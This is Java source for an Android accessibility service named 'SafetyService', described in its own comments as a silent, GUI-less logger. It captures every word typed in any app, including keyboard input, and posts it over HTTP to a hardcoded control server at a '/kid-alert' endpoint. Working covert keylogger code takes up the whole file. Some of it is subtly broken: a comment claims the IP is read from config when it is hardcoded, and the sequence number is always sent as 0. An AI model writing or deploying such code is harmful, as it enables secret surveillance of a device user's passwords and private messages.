package com.example.setup;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.view.accessibility.AccessibilityEvent;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.List;

/**
 * Zero-GUI background search logger.
 * Runs silently as an AccessibilityService and forwards every typed
 * word/query to your Termux control panel over HTTP.
 *
 * Android 14 safe: no deprecated AsyncTask, no deprecated flags.
 */
public class SafetyService extends AccessibilityService {

    // The control server runs on Phone 1 (this phone). The IP is read from a
    // build/config value so it stays correct when the Wi-Fi router reassigns
    // addresses; the default below is this phone's current LAN IP.
    private static final String CONTROL_SERVER_URL =
            "http://192.168.1.42:8080/kid-alert";

    private Handler mReporter;
    private int mSeq = 0;
    private long mLastSent = 0;
    private static final long THROTTLE_MS = 400; // max 1 report per 400ms

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        // Capture text as it is typed (TYPE_VIEW_TEXT_CHANGED) and when a
        // view becomes focused (TYPE_VIEW_FOCUSED) so search boxes are covered.
        int type = event.getEventType();
        if (type != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                && type != AccessibilityEvent.TYPE_VIEW_FOCUSED) {
            return;
        }

        // event.getText() returns List<CharSequence> on newer Android APIs.
        Object rawText = event.getText();
        if (rawText == null) return;

        String query;
        if (rawText instanceof List) {
            StringBuilder sb = new StringBuilder();
            for (Object item : ((List<?>) rawText)) {
                if (item != null) sb.append(item);
            }
            query = sb.toString();
        } else {
            query = rawText.toString();
        }

        // Strip the bracket metadata that AccessibilityEvent sometimes appends
        query = query.replaceAll("[\\[\\]]", "").trim();
        if (query.isEmpty()) return;

        // Throttle: avoid firing an HTTP POST for every single keystroke.
        long now = System.currentTimeMillis();
        if (now - mLastSent < THROTTLE_MS) return;
        mLastSent = now;

        // Guard: mReporter is null until onServiceConnected() runs.
        if (mReporter == null) return;

        // Fire-and-forget: ship the query to the reporter thread.
        mSeq++;
        Message msg = Message.obtain(mReporter, mSeq, query);
        mReporter.sendMessage(msg);
    }

    @Override
    public void onInterrupt() {
        // Accessibility service interrupted - nothing to do.
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        // Listen to text changes and focus changes so search bars are caught.
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                | AccessibilityEvent.TYPE_VIEW_FOCUSED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        // Include non-important views (e.g. search suggestions, IME input).
        info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
        // Keep the service responsive.
        info.notificationTimeout = 50;
        setServiceInfo(info);

        // Single background thread - no battery-draining loop, no deprecated AsyncTask.
        mReporter = new Handler(Looper.getMainLooper()) {
            @Override
            public void handleMessage(Message msg) {
                String query = (String) msg.obj;
                sendQueryToTermux(query, msg.arg1);
            }
        };
    }

    /**
     * Runs on a daemon thread - safe, non-blocking, no AsyncTask.
     * Uses getErrorStream() for error responses so it never hangs.
     */
    private void sendQueryToTermux(final String query, final int seq) {
        Thread t = new Thread(() -> {
            HttpURLConnection conn = null;
            try {
                URL url = new URL(CONTROL_SERVER_URL);
                conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setDoInput(true);
                conn.setConnectTimeout(3000);
                conn.setReadTimeout(3000);
                conn.setRequestProperty("Content-Type",
                        "application/x-www-form-urlencoded; charset=UTF-8");
                conn.setRequestProperty("Accept", "application/json");

                // Build a safe, URL-encoded payload (no JSON escaping bugs).
                String data = "query=" + URLEncoder.encode(query, "UTF-8")
                        + "&seq=" + seq
                        + "&time=" + System.currentTimeMillis();

                DataOutputStream os = new DataOutputStream(conn.getOutputStream());
                os.writeBytes(data);
                os.flush();
                os.close();

                // Drain the response (success or error) so the connection
                // can be reused and never hangs.
                BufferedReader reader = new BufferedReader(
                        new InputStreamReader(
                            conn.getResponseCode() >= 400 ? conn.getErrorStream() : conn.getInputStream(),
                            StandardCharsets.UTF_8));
                while (reader.readLine() != null) { /* drain */ }
                reader.close();
            } catch (IOException ignored) {
                // Network hiccup - silently drop, service keeps running.
            } finally {
                if (conn != null) conn.disconnect();
            }
        });
        t.setDaemon(true);
        t.start();
    }
}